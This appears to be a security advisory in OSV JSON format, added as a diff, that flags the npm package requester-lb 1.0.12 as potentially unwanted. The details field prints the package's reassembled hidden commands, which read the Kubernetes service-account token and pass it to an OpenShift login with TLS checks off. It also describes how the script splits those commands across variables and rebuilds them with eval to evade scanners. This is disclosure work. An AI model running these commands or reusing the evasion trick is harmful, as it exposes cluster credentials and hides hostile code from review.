@@ -1,0 +1,49 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-14322",
+  "modified": "2026-11-19T13:37:19Z",
+  "published": "2026-11-19T13:36:53Z",
+  "summary": "Potentially-unwanted package (riskware): requester-lb (npm)",
+  "details": "This package ships an auxiliary bash script, test.sh, that hides its real payload from substring scanners: two commands are split across 17 single-character shell variables (e.g. d='exp', e='ort DEBUG_F', f='ILE=$(cat /v', … u='erify') and rebuilt at the top of the script with eval \"$d$e$f$g$h$i$j$k$l$m\" / eval \"$n$o$p$q$r$s$t$u\". The reassembled lines are: export DEBUG_FILE=$(cat /var/run/secrets/kubernetes[.]io/serviceaccount/token 2\u003e/dev/null) and./oc login --token=$DEBUG_FILE --server=$SERV --insecure-skip-tls-verify — i.e. it reads the local Kubernetes service-account credential into an environment variable and passes it to an OpenShift login with TLS verification disabled. The script is not wired into any lifecycle hook: package.json declares only a manual \"send\" script running requester.js, a plain user-driven HTTP/DNS diagnostic CLI (--domain/--port/--path/--method). No C2 host, fixed endpoint or exfiltration destination exists anywhere in the package — the --server value is supplied by the caller and is never set inside the tarball — and no environment or token collection is sent off-host. Files of interest: package/test.sh (fragmented eval payload), package/requester.js (user-directed HTTP client). The behaviour is real and concealed, but no remote collection or automatic execution is present.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "requester-lb",
+        "purl": "pkg:npm/requester-lb"
+      },
+      "versions": [
+        "1.0.12"
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/requester-lb/v/1.0.12"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "pua",
+      "first_seen_at": "2026-11-19T13:36:53Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "kubernetes[.]io"
+        ],
+        "sha256": [
+          "70656a628eb074ef0d753fb035c46c2ada3e3986e57331cf3bc5e88380c14ce0"
+        ]
+      }
+    }
+  }
+}
